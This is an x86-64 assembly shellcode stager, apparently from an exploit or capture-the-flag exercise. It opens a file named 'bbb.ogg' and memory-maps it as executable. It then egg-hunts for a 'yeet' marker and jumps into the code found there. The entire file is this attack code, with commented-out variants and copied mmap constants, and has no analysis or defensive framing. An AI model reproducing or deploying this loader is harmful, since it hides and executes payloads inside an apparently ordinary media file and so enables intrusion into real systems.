_start:
; open
;	mov rax, 0x02
	xor rsi, rsi
	push rsi
	mov rdi, "bbb.ogg"
	push rdi
	mov rdi, rsp
	mov al, 0x02
	syscall

;#define PROT_READ	0x1     /* Page can be read.  */
;#define PROT_WRITE	0x2     /* Page can be written.  */
;#define PROT_EXEC	0x4     /* Page can be executed.  */
;#define PROT_NONE	0x0     /* Page can not be accessed.  */


;#define MAP_SHARED	0x01    /* Share changes.  */
;#define MAP_PRIVATE	0x02    /* Changes are private.  */

;#define MAP_FIXED	0x10    /* Interpret addr exactly.  */
;#define MAP_FILE	0
;#define MAP_ANONYMOUS	0x20    /* Don't use a file.  */
;#define MAP_ANON	MAP_ANONYMOUS

;#define MAP_DENYWRITE	0x0800  /* ETXTBSY */
;#define MAP_FOOBAR	0x0800  /* ETXTBSY */

; mmap
	mov r8, rax	;fd

	xor rdi, rdi	;addr
;	mov si, 0x1000	;length
;	mov rsi, rsp	; really big length
;	mov si 0x31337
;	mov esi, 0x1000	;length
;	mov rdx, 0x05 ;prot (prot_exec | prot_read)
;	mov dl, 0x05 ;prot (prot_exec | prot_read)
	mov edx, 0x05 ;prot (prot_exec | prot_read)
	mov esi, 0x74656579	; yeet, and also size?

	xor r9, r9	;offset
;	mov r10, 0x02 ; flags ; map_private
	mov r10b, 0x02 ; flags ; map_private

;	mov rax, 0x09	; mmap
	mov al, 0x09	; mmap
	syscall
;egghunt
egghunt:
	inc rax
	mov ebx, [rax+0x2]
;	cmp ebx, 0x74656579	; yeet
	cmp ebx, esi		; yeet
	jnz egghunt

; jump
	call rax
